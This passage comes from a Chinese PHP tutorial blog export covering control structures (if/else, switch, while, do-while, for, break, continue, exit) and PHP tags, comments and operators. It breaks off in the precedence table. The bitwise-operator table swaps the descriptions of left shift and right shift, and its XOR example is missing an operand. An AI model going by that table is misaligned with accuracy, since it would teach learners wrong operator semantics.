<li>在任何一门程序设计语言中，都需要支持满足程序结构化所需要的三种基本结构:<ul>
<li><strong>顺序结构</strong></li>
<li><strong>分支结构（选择结构）</strong></li>
<li><strong>循环结构</strong></li>
</ul>
</li>
</ul>
<h2 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构"></a>分支结构</h2><h3 id="单一条件分支结构-if"><a href="#单一条件分支结构-if" class="headerlink" title="单一条件分支结构(if)"></a>单一条件分支结构(if)</h3><p>当条件表达式的值为真<code>true</code>时，<code>PHP</code>将执行语句组，相反条件表达式的值为假<code>false</code>时，<code>PHP</code>将不执行语句组，忽略语句组执行下面的语句。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a&#x3D;5;</span><br><span class="line">	$b&#x3D;3;</span><br><span class="line">    if ($a &gt; $b)</span><br><span class="line">        echo &quot;a &gt; b&quot;; &#x2F;&#x2F;如果变量a的值大于b的值则会输出：a大于b</span><br><span class="line">    </span><br><span class="line">    $x&#x3D;10;</span><br><span class="line">    $y&#x3D;20;</span><br><span class="line">    if($x&lt;$y)&#123;          &#x2F;&#x2F;判断是否x小于y。多条语句需要使用&#123; &#125;括起来。</span><br><span class="line">         $t&#x3D;$x;</span><br><span class="line">         $x&#x3D;$y;</span><br><span class="line">         $y&#x3D;$t;</span><br><span class="line">    &#125;</span><br><span class="line">    var_dump($x&gt;$y);  &#x2F;&#x2F;输出：bool(true)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="双向条件分支结构-else从句"><a href="#双向条件分支结构-else从句" class="headerlink" title="双向条件分支结构(else从句)"></a>双向条件分支结构(else从句)</h3><p><code>if-else</code> 条件判断与 <code>if</code> 条件判断类似，所不同的是，<code>if-else</code> 语<br>句的条件表达式值为真<code>true</code>时，会执行 <code>if</code> 的本体语句<strong>语句组1</strong>，<br>而条件表达式值为假<code>false</code>时，则执行 <code>else</code> 的本体语句<strong>语句组2</strong>。</p>
<p><img src="https://qiniu.hzktester.top/tp2020102101.png" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(false)&#123;  &#x2F;&#x2F; 真区间</span><br><span class="line">	echo 1;</span><br><span class="line">&#125; else &#123;    &#x2F;&#x2F; 假区间</span><br><span class="line">	echo 2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="多向条件分支结构-else-if子句"><a href="#多向条件分支结构-else-if子句" class="headerlink" title="多向条件分支结构(else if子句)"></a>多向条件分支结构(else if子句)</h3><p><img src="https://qiniu.hzktester.top/tp2020102102.png" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    date_default_timezone_set(&quot;Etc&#x2F;GMT-8&quot;);       &#x2F;&#x2F;设置时区，中国大陆采用东八区的时间</span><br><span class="line">    echo &quot;当前时间&quot;.date(&quot;Y-m-d H:i:s&quot;,time()).&quot; &quot;; &#x2F;&#x2F;通过date()函数获取当前时间，并输出</span><br><span class="line">    </span><br><span class="line">    $hour &#x3D; date(&quot;H&quot;);             	 &#x2F;&#x2F;获取服务器时间中当前的小时，作为分时问候的条件</span><br><span class="line">    if( $hour &lt; 6 ) &#123;                     &#x2F;&#x2F;如果当前时间在6点以前，执行下面的语句块</span><br><span class="line">        echo &quot;凌晨好!&quot;;</span><br><span class="line">    &#125; else if ( $hour &lt; 9 ) &#123;           &#x2F;&#x2F;如果当前时间在6点之后和9点以前，执行下面的语句块</span><br><span class="line">        echo &quot;早上好!&quot;;</span><br><span class="line">    &#125; else if ( $hour &lt; 12 ) &#123;         &#x2F;&#x2F;如果当前时间在9点之后和12点以前，执行下面的语句块</span><br><span class="line">        echo &quot;上午好!&quot;;</span><br><span class="line">    &#125; else if ( $hour &lt; 14 ) &#123;         &#x2F;&#x2F;如果当前时间在12点之后和14点以前，执行下面的语句块</span><br><span class="line">        echo &quot;中午好!&quot;;</span><br><span class="line">    &#125; else if ( $hour &lt; 17 ) &#123;          &#x2F;&#x2F;如果当前时间在14点之后和17点以前，执行下面的语句块</span><br><span class="line">        echo &quot;下午好!&quot;;</span><br><span class="line">    &#125; else if ( $hour &lt; 19 ) &#123;          &#x2F;&#x2F;如果当前时间在17点之后和19点以前，执行下面的语句块</span><br><span class="line">        echo &quot;傍晚好!&quot;;</span><br><span class="line">    &#125; else if ( $hour &lt; 22 ) &#123;          &#x2F;&#x2F;如果当前时间在19点之后和22点以前，执行下面的语句块</span><br><span class="line">        echo &quot;晚上好!&quot;;</span><br><span class="line">    &#125; else &#123;                                  &#x2F;&#x2F;如果当前时间在22点之后和次日1点以前，执行下面语句块</span><br><span class="line">        echo &quot;夜里好!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="多向条件分支结构-switch语句"><a href="#多向条件分支结构-switch语句" class="headerlink" title="多向条件分支结构(switch语句)"></a>多向条件分支结构(switch语句)</h3><p>当程序执行碰到<code>switch</code>条件判断时，它会取出键值，然后与语句体中的<code>case</code>所列出的值逐一比较，如果数值不符合，则将数值往下一个<code>case</code>传递，如果数值符合，则执行<code>case</code>中的语句，然后再碰到<code>break</code>语句即跳出<code>switch</code>条件判断，如果所有的值比对都不符合，则会执行<code>default</code>中的语句 。</p>
<p><img src="https://qiniu.hzktester.top/tp2020102103.png" alt="image"></p>
<p><code>switch</code>语句使用注意事项:</p>
<ul>
<li><code>switch</code>语句与<code>if</code>语句不同，它仅能判断一种关系：<strong>是否恒等</strong>。 </li>
<li><code>switch</code>语句中<code>case</code>子句的常量可以是整型常量、字符型常量、表达式或变量。</li>
<li>在同一个<code>switch</code>中，<code>case</code>子句的常量不能相同，否则第二个值永远无法匹配到。</li>
<li><code>case</code> 和 <code>default</code> 子句后面的语句序列允许由多个可执行语句组成，且不必用<code>｛ ｝</code>括起来，也可以为空语句。</li>
<li><code>switch</code>语句中可省略<code>break</code>语句和<code>default</code>子句。但省略后会改变流程。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	date_default_timezone_set(&quot;Etc&#x2F;GMT-8&quot;);		&#x2F;&#x2F;设置时区，中国大陆采用东八区的时间</span><br><span class="line">    $week &#x3D; date(&quot;D&quot;);   						&#x2F;&#x2F;获取当前星期几</span><br><span class="line">    switch( $week ) &#123;</span><br><span class="line">        case &quot;Mon&quot;: echo &quot;星期一&quot;;  break;                </span><br><span class="line">        case &quot;Tue&quot;: echo &quot;星期二&quot;;  break;                    </span><br><span class="line">        case &quot;Wed&quot;: echo &quot;星期三&quot;;  break;                    </span><br><span class="line">        case &quot;Thu&quot;: echo &quot;星期四&quot;;  break;              </span><br><span class="line">        case &quot;Fri&quot;: echo &quot;星期五&quot;;  break;           </span><br><span class="line">        case &quot;Sat&quot;: echo &quot;星期六&quot;;  break;        </span><br><span class="line">        case &quot;Sun&quot;: echo &quot;星期日&quot;;  break;        </span><br><span class="line">    &#125;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="巢状条件分支结构"><a href="#巢状条件分支结构" class="headerlink" title="巢状条件分支结构"></a>巢状条件分支结构</h3>巢状式条件分支结构就是<code>if</code>语句的嵌套，即指<code>if</code>或<code>else</code>后面的语句块中又包含<code>if</code>语句。<code>if</code>语句可以无限层地嵌套在其他<code>if</code>语句，这给程序的不同部分的条件执行提供了充分的弹性。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a&#x3D;88;</span><br><span class="line">	echo &quot;数学成绩:&quot;.$a;</span><br><span class="line">	if($a&gt;&#x3D;60)&#123;</span><br><span class="line">		if($a&gt;&#x3D;70)&#123;</span><br><span class="line">			if($a&gt;&#x3D;90)&#123;</span><br><span class="line">				echo &quot;不错喔!!这次数学成绩甲等!!&quot;;</span><br><span class="line">			&#125;else&#123;	</span><br><span class="line">				echo &quot;还可以...这次数学成绩乙等!!&quot;; </span><br><span class="line">			&#125;</span><br><span class="line">	 	&#125;else&#123;</span><br><span class="line">     	echo &quot;勉勉强强及格边缘...这次数学成绩丙等!!&quot;;</span><br><span class="line">	 	&#125;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		echo &quot;有待下次努力...数学成绩不及格!!&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><p>当<code>while</code>循环语句中表达式<strong>循环控制语句</strong>的结果为真时，程序将反复执行同一段程序：<strong>循环体while中的语句或语句序列</strong>，直到满足一定的条件<strong>表达式的结果为假时</strong>后才停止执行该段程序。</p>
<p><img src="https://qiniu.hzktester.top/tp2020102104.png" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	&#x2F;&#x2F;求1到100的累加。</span><br><span class="line">	$i&#x3D;1;	</span><br><span class="line"> 	$sum&#x3D;0;</span><br><span class="line">	while($i&lt;&#x3D;100)</span><br><span class="line">	&#123;</span><br><span class="line">		$sum+&#x3D;$i;</span><br><span class="line">		$i++;</span><br><span class="line">	&#125;</span><br><span class="line">	echo $sum;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="do-while循环"><a href="#do-while循环" class="headerlink" title="do while循环"></a>do while循环</h3><p>序会先执行<code>do</code>语句体中的语句<strong>循环体</strong>，然后再检查表达式<strong>循环控制语句</strong>的值，如果符合条件式<strong>值为真</strong>，就再进行<code>do</code> 语句体中的语句，直到条件不符合为止</p>
<ul>
<li><code>do-while</code>后面必须加上分号作为结束</li>
<li><code>do-while</code>与<code>while</code>的最大区别是先执行循环体然后再判断循环的控制条件</li>
</ul>
<h4 id="示例1：求1-100的累加"><a href="#示例1：求1-100的累加" class="headerlink" title="示例1：求1-100的累加"></a>示例1：求1-100的累加</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php	&#x2F;&#x2F;求1到100的累加。</span><br><span class="line">	$i&#x3D;1; 	</span><br><span class="line">	$sum&#x3D;0;</span><br><span class="line">	do&#123;</span><br><span class="line">		   $sum+&#x3D;$i;</span><br><span class="line">	      $i++;</span><br><span class="line">	&#125;while($i&lt;&#x3D;100);</span><br><span class="line">	echo $sum;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="示例2：使用while循环嵌套输出表格"><a href="#示例2：使用while循环嵌套输出表格" class="headerlink" title="示例2：使用while循环嵌套输出表格"></a>示例2：使用while循环嵌套输出表格</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;Document&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;table align&#x3D;&quot;center&quot; border&#x3D;&quot;1&quot; width&#x3D;600&gt;</span><br><span class="line">            &lt;caption&gt;&lt;h1&gt;使用while循环嵌套输出表格&lt;&#x2F;h1&gt;&lt;&#x2F;caption&gt;</span><br><span class="line">            &lt;?php</span><br><span class="line">                $out &#x3D; 0;                                   &#x2F;&#x2F;外层循环需要计数的累加变量</span><br><span class="line">                while( $out &lt; 10 ) &#123;                        &#x2F;&#x2F;指定外层循环，并且循环次数为10次</span><br><span class="line">                    $bgcolor &#x3D; $out%2 &#x3D;&#x3D; 0 ? &quot;#FFFFFF&quot; : &quot;#DDDDDD&quot;;</span><br><span class="line">                    echo &quot;&lt;tr bgcolor&#x3D;&quot;.$bgcolor.&quot;&gt;&quot;;       &#x2F;&#x2F;执行一次则输出一行并指定背景颜色</span><br><span class="line">                    $in &#x3D; 0;                                &#x2F;&#x2F;内层循环需要计数的累加变量</span><br><span class="line">                    while( $in &lt; 10 ) &#123;                     &#x2F;&#x2F;指定内层循环，并且循环次数为10次</span><br><span class="line">                        echo &quot;&lt;td&gt;&quot;.($out*10+$in).&quot;&lt;&#x2F;td&gt;&quot;;  &#x2F;&#x2F;执行一次，输出一个单元格</span><br><span class="line">                        $in++;                              &#x2F;&#x2F;内层的计数变量累加</span><br><span class="line">                    &#125;</span><br><span class="line">                    echo &quot;&lt;&#x2F;tr&gt;&quot;;                           &#x2F;&#x2F;输出行关闭标记</span><br><span class="line">                    $out++;                                 &#x2F;&#x2F;外层的计数变量累加</span><br><span class="line">                &#125;</span><br><span class="line">            ?&gt;</span><br><span class="line">        &lt;&#x2F;table&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020102106.png" alt="image"></p>
<h3 id="fro循环"><a href="#fro循环" class="headerlink" title="fro循环"></a>fro循环</h3><p><code>for</code>循环语句中<strong>表达式1为循环初始条件</strong>；<strong>表达式2为循环控制条件</strong>；<strong>表达式3为控制变量递增</strong>；语句或语句序列为循环体。</p>
<p><img src="https://qiniu.hzktester.top/tp2020102105.png" alt="image"></p>
<h4 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;Document&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;?php</span><br><span class="line">    	&#x2F;&#x2F;使用花括号“&#123;&#125;”将代码块括起来，通常代码块为一条时可以不加花括号</span><br><span class="line">    	for( $i &#x3D; 1;  $i &lt;&#x3D; 10;  $i++ ) &#123;</span><br><span class="line">        	echo &quot;这是第&lt;b&gt; $i &lt;&#x2F;b&gt;次循环执行输出的结果&lt;br&gt;&quot;;  </span><br><span class="line">    	&#125;</span><br><span class="line">    	$i &#x3D; 1; &#x2F;&#x2F;将for语句中第一部分初始化提出来，放到for前面执行，但for语句中的分号要保留</span><br><span class="line">    	for( ;  $i &lt;&#x3D; 10;  $i++ ) &#123;</span><br><span class="line">        	echo &quot;这是第&lt;b&gt; $i &lt;&#x2F;b&gt;次循环执行输出的结果&lt;br&gt;&quot;;  </span><br><span class="line">    	&#125;</span><br><span class="line">    	$i &#x3D; 1; &#x2F;&#x2F;再将第三部分的增量提出来，放到for语句的执行体最后，但也要将分号保留</span><br><span class="line">    	for( ;  $i &lt;&#x3D; 10; ) &#123;</span><br><span class="line">        	echo &quot;这是第&lt;b&gt; $i &lt;&#x2F;b&gt;次循环执行输出的结果&lt;br&gt;&quot;;</span><br><span class="line">        	$i++;   </span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line">    	$i &#x3D; 1;</span><br><span class="line">    	for( ; ; ) &#123;</span><br><span class="line">        	if( $i &gt; 10 )</span><br><span class="line">            	break;</span><br><span class="line">        	echo &quot;这是第&lt;b&gt; $i &lt;&#x2F;b&gt;次循环执行输出的结果&lt;br&gt;&quot;;</span><br><span class="line">        	$i++;   </span><br><span class="line">    	&#125;</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020102107.png" alt="image"></p>
<h2 id="特殊流程控制语句"><a href="#特殊流程控制语句" class="headerlink" title="特殊流程控制语句"></a>特殊流程控制语句</h2><h3 id="break语句"><a href="#break语句" class="headerlink" title="break语句"></a>break语句</h3><p>我们之前在<code>switch</code>条件判断中已经使用过<code>break</code> 关键字，它会使得程序流程离开<code>switch</code>本体中的语句，如果<code>break</code>使用在 <code>for</code>、<code>while</code> 或 <code>do-while</code> 循环结构中时，将会使得程序<strong>跳出该层循环</strong>。</p>
<h3 id="continue语句"><a href="#continue语句" class="headerlink" title="continue语句"></a>continue语句</h3><p><code>continue</code>的作用与<code>break</code>有点类似，<code>continue</code>若使用在<code>for</code>、<code>while</code>或 <code>do-while</code>循环结构中，当程序执行至<code>continue</code> 时，之后的语句将直接被略过，而直接<strong>执行下一次的循环动作</strong>。</p>
<h3 id="exit-函数和die-函数"><a href="#exit-函数和die-函数" class="headerlink" title="exit()函数和die()函数"></a>exit()函数和die()函数</h3><p>当前的脚本中只要执行到<code>exit</code>语句，而不管它在哪个结构中都会直接退出当前脚本。<code>exit</code>是一个函数，当前使用过的<code>die()</code>函数就是<code>exit()</code>的别名。可以带参数输出一条消息，并退出当前脚本。</p>
]]></content>
      <categories>
        <category>PHP基础</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>标记、注释、运算符、表达式、变量</title>
    <url>/posts/79ae17a0.html</url>
    <content><![CDATA[<h2 id="PHP语言标记"><a href="#PHP语言标记" class="headerlink" title="PHP语言标记"></a>PHP语言标记</h2><ul>
<li>以<code>&lt;?php</code>开始<code>?&gt;</code>结束标记是标准风格，这是<code>PHP</code>推荐使用的标记风格。</li>
<li>以<code>&lt;script language=&quot;php&quot;&gt;</code>开始和<code>&lt;/script&gt;</code>结束是长风格标记，这种标记最长，总是可用的，但我们并不常用。</li>
<li>以<code>&lt;?</code>开始和以<code>?&gt;</code>结束标记是简短风格的标记，是最简单的，但是系统管理员偶尔会禁用掉它，因为它会干扰<code>XML</code>文档的声明。只用通过<code>php.ini</code>配置文件中的指令<code>short_open_tag</code>打开后就可以使用。</li>
<li>以<code>&lt;%</code>开始和以<code>%&gt;</code>结束标记是<code>ASP</code>风格的标记，可以在<code>php.ini</code>配置文件设定中启用了<code>asp_tags</code>选项就可以使用它（默认是禁用的），习惯了<code>ASP</code>风格的可以使用它。</li>
</ul>
<h2 id="PHP程序注释"><a href="#PHP程序注释" class="headerlink" title="PHP程序注释"></a>PHP程序注释</h2><p>PHP支持C、C＋＋和Shell脚本风格的注释，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;... ...	单行注释</span><br><span class="line">&#x2F;* ... ... *&#x2F; 多行注释 		（注意：不能嵌套）</span><br><span class="line"># ... ... 	脚本注释</span><br></pre></td></tr></table></figure>

<h2 id="PHP中的运算符"><a href="#PHP中的运算符" class="headerlink" title="PHP中的运算符"></a>PHP中的运算符</h2><blockquote>
<p>运算符是可以通过给出的一或多个值（用编程行话来说，表达式）来产生另一个值（因而整个结构成为一个表达式）的东西。所以可以认为函数或任何会返回一个值（例如 print）的结构是运算符，而那些没有返回值的（例如 echo）是别的东西。 </p>
</blockquote>
<p>有三种类型的运算符：</p>
<ul>
<li><strong>一元运算符</strong>:只运算一个值，例如 <code>!</code>（取反运算符）或 <code>++</code>（加一运算符）。</li>
<li><strong>二元运算符</strong>:有两个操作数，PHP支持的大多数运算符都是这种。</li>
<li><strong>三元运算符</strong>：<code>? :</code>。它应该被用来根据一个表达式在另两个表达式中选择一个，而不是用来在两个语句或者程序路线中选择。把整个三元表达式放在扩号里是个很好的主意。</li>
</ul>
<h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><table>
<thead>
<tr>
<th>运算符</th>
<th>意义</th>
<th>示例</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>加法运算</td>
<td>$a+$b</td>
<td>$a+$b的和</td>
</tr>
<tr>
<td>-</td>
<td>减法/取负运算</td>
<td>$a-$b</td>
<td>$a和$b的差</td>
</tr>
<tr>
<td>*</td>
<td>乘法运算</td>
<td>$a*$b</td>
<td>$a和$b的积</td>
</tr>
<tr>
<td>/</td>
<td>除法运算</td>
<td>$a/$b</td>
<td>$a和$b的商</td>
</tr>
<tr>
<td>%</td>
<td>求余运算符（取模运算）</td>
<td>$a%$b</td>
<td>$a和$b的余数</td>
</tr>
<tr>
<td>++</td>
<td>累加1</td>
<td>$a++或++$a</td>
<td>$a的值加1</td>
</tr>
<tr>
<td>--</td>
<td>递减1</td>
<td>$a--或--$a</td>
<td>$a的值减1</td>
</tr>
</tbody></table>
<h3 id="字符串运算符"><a href="#字符串运算符" class="headerlink" title="字符串运算符"></a>字符串运算符</h3><p>有两个字符串运算符：</p>
<ul>
<li><code>.</code>连接运算符：返回其左右参数连接后的字符串</li>
<li><code>.=</code>连接赋值运算符：将右边参数附加到左边的参数<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a &#x3D; &quot;Hello &quot;;</span><br><span class="line">$b &#x3D; $a . “World!”; 	&#x2F;&#x2F; 现在$b的值： Hello World!</span><br><span class="line"></span><br><span class="line">$a &#x3D; &quot;Hello &quot;;</span><br><span class="line">$a .&#x3D; “World!”; 	&#x2F;&#x2F; 现在$a的值： Hello World!</span><br></pre></td></tr></table></figure>
<h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3>基本的赋值运算符是<code>=</code>。一开始可能会以为它是“等于”，其实不是的。它实际上意味着把右边表达式的值赋给左边的运算数。</li>
</ul>
<table>
<thead>
<tr>
<th>运算符</th>
<th>意义</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>=</td>
<td>将一个值或表达式的结果赋给变量</td>
<td>$x=3</td>
</tr>
<tr>
<td>+=</td>
<td>将变量与所赋的值相加后的结果赋给该变量</td>
<td>$x+=3等价于$x=$x+3</td>
</tr>
<tr>
<td>-=</td>
<td>将变量与所赋的值相减后的结果赋给该变量</td>
<td>$x-=3等价于$x=$x-3</td>
</tr>
<tr>
<td>*=</td>
<td>将变量与所赋的值相乘后的结果赋给该变量</td>
<td>$x*=3等价于$x=$x*3</td>
</tr>
<tr>
<td>/=</td>
<td>将变量与所赋的值相除后的结果赋给该变量</td>
<td>$x/=3等价于$x=$x/3</td>
</tr>
<tr>
<td>%=</td>
<td>将变量与所赋的值求模后的结果赋给该变量</td>
<td>$x%=3等价于$x=$x%3</td>
</tr>
<tr>
<td>.=</td>
<td>将变量与所赋的值相连后的结果赋给该变量</td>
<td>$x.=”H”等价于$x=$x.“H”</td>
</tr>
</tbody></table>
<h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>说明</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>&gt;</td>
<td>大于</td>
<td>当左边大于右边时返回true，否则返回false</td>
<td>$a&gt;$b</td>
</tr>
<tr>
<td>&lt;</td>
<td>小于</td>
<td>当左边小于右边时返回true，否则返回false</td>
<td>$a&lt;$b</td>
</tr>
<tr>
<td>&gt;=</td>
<td>大于等于</td>
<td>当左边大于等于右边时返回true，否则false</td>
<td>$a&gt;=$b</td>
</tr>
<tr>
<td>&lt;=</td>
<td>小于等于</td>
<td>当左边小于等于右边时返回true，否则false</td>
<td>$a&lt;=$b</td>
</tr>
<tr>
<td>==</td>
<td>等于</td>
<td>两边操作数的值相等时返回true，否则false</td>
<td>$a==$b</td>
</tr>
<tr>
<td>===</td>
<td>全等于</td>
<td>两边值相等并且类型相等返回true，否则false</td>
<td>$a===$b</td>
</tr>
<tr>
<td>&lt;&gt;或!=</td>
<td>不等于</td>
<td>两边值不等时返回true，否则返回false</td>
<td>$a&lt;&gt;$b 或 $a!=$b</td>
</tr>
<tr>
<td>!==</td>
<td>非全等于</td>
<td>两边值与类型都相同时返回false，否则true</td>
<td>$a!==$b</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(9 &gt; 6);    </span><br><span class="line">&#x2F;&#x2F;如果 9大于6 它就返回true  否则就返回false</span><br><span class="line">var_dump(9 &#x3D;&#x3D;&#x3D; &#39;9&#39;) </span><br><span class="line">&#x2F;&#x2F; 全等于  一定要两种都相同  第一种就是值相同 第二种就是类型相同</span><br></pre></td></tr></table></figure>
<h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>说明</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>and或&amp;&amp;</td>
<td>逻辑与</td>
<td>当两边操作数都为true时，返回true，否则返回false</td>
<td>$a and $b 或 $a &amp;&amp; $b</td>
</tr>
<tr>
<td>or或||</td>
<td>逻辑或</td>
<td>当两边操作数都为false时，返回false，否则返回true</td>
<td>$a or $b 或 $a || $b</td>
</tr>
<tr>
<td>not或！</td>
<td>逻辑非</td>
<td>当操作数为true时返回false，否则返回true</td>
<td>not $b 或 !$b</td>
</tr>
<tr>
<td>xor</td>
<td>逻辑异或</td>
<td>当两边操作数只有一个为true时，返回true，否则返回false</td>
<td>$a xor $b</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(true &amp;&amp; false);</span><br><span class="line">    &#x2F;&#x2F;判断两边是否为真  如果为真那么就返回true 否则就返回false</span><br><span class="line">var_dump(true || false);</span><br><span class="line">    &#x2F;&#x2F;只要有一方为真  那么都为真  都为false时候就为 false</span><br><span class="line">var_dump(!false);</span><br><span class="line">    &#x2F;&#x2F;取反</span><br><span class="line">var_dump(true xor false);</span><br><span class="line">    &#x2F;&#x2F;逻辑异或</span><br></pre></td></tr></table></figure>
<h3 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h3><table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>说明</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>&amp;</td>
<td>按位与</td>
<td>只有参与运算的两位都为1时，运算结果才为1，否则为0.</td>
<td>$a &amp; $b</td>
</tr>
<tr>
<td>|</td>
<td>按位或</td>
<td>只有参与运算的两位都为0时，运算结果才为0，否则为1.</td>
<td>$a | $b</td>
</tr>
<tr>
<td>^</td>
<td>按位异或</td>
<td>只有参与运算的两位不同，运算结果才为1，否则为0.</td>
<td>^$b</td>
</tr>
<tr>
<td>~</td>
<td>按位非</td>
<td>将用二进制表示的操作数中的1变成0，0变成1.</td>
<td>～$a</td>
</tr>
<tr>
<td>&lt;&lt;</td>
<td>左移</td>
<td>将左边的操作数在内存中的二进制数据右移右边操作数指定的位数，右边移空的部分补上0</td>
<td>$a&lt;&lt;$b</td>
</tr>
<tr>
<td>&gt;&gt;</td>
<td>右移</td>
<td>将左边的操作数在内存中的二进制数据左移右边操作数指定的位数，左边移空的部分补上0</td>
<td>$a&gt;&gt;$b</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(true &amp; false);</span><br></pre></td></tr></table></figure>
<h3 id="其他运算符"><a href="#其他运算符" class="headerlink" title="其他运算符"></a>其他运算符</h3><table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>? :</td>
<td>三元运算符，可以提供简单的逻辑判断。</td>
<td>$a&lt;$b?$c=1:$c=0</td>
</tr>
<tr>
<td>``</td>
<td>反引号(``)是执行运算符，PHP将尝试将反引号中的内容作外壳命令来执行，并将其输入信息返回</td>
<td>$a=`ls -al`</td>
</tr>
<tr>
<td>@</td>
<td>错误控制运算符，当将其放置在一个PHP表达式之前，该表达式可能产生的任何错误信息都被忽略掉。</td>
<td>@表达式</td>
</tr>
<tr>
<td>=&gt;</td>
<td>数组下标指定符号，通过此符号指定数组的键与值。</td>
<td>键=&gt;值</td>
</tr>
<tr>
<td>-&gt;</td>
<td>对象成员访问符号，访问对象中的成员属性或成员方法。</td>
<td>对象-&gt;成员</td>
</tr>
<tr>
<td>instanceof</td>
<td>类型运算符，用来测定一个给定的对象是否来自指定的对象类。</td>
<td>对象instanceof类名</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(false ? &#39;1&#39; : &#39;2&#39;);</span><br><span class="line">$a&#x3D;&#96;ls -al&#96;</span><br><span class="line">var_dump(@$_GET[&#39;id&#39;]);</span><br><span class="line">$info &#x3D; array(&#39;key&#39;&#x3D;&gt;&#39;1&#39;);</span><br><span class="line">$info &#x3D; new Object();</span><br><span class="line">$info-&gt;one();</span><br></pre></td></tr></table></figure>
<h3 id="运算符的优先级"><a href="#运算符的优先级" class="headerlink" title="运算符的优先级"></a>运算符的优先级</h3><table>
<thead>
<tr>
<th><strong>优先级</strong></th>
<th><strong>结合方向</strong></th>
<th><strong>运算符</strong></th>
<th><strong>附加信息</strong></th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>无结合</td>
<td>clone、new</td>
<td>clone 和 new</td>
</tr>
<tr>
<td>2</td>
<td>从右向左</td>
<td>**</td>
<td>算术运算符</td>
</tr>
<tr>
<td>3</td>
<td>从右向左</td>
<td>++、–、~、(int)、(float)、(string)、(array)、(object)、(bool)、@</td>
<td>类型、递增／递减、错误控制</td>
</tr>
<tr>
<td>4</td>
<td>无结合</td>
<td>instanceof</td>
<td>类型</td>
</tr>
<tr>
<td>5</td>
<td>从右向左</td>
<td>!</td>
<td>逻辑运算符</td>
</tr>
<tr>
<td>6</td>
<td>从左向右</td>
<td>*、/、%</td>
<td>算术运算符</td>
</tr>
<tr>
<td>7</td>
<td>从左向右</td>
<td>+、-、.</td>
<td>算术运算符和字符串运算符</td>
</tr>
<tr>
<td>8</td>
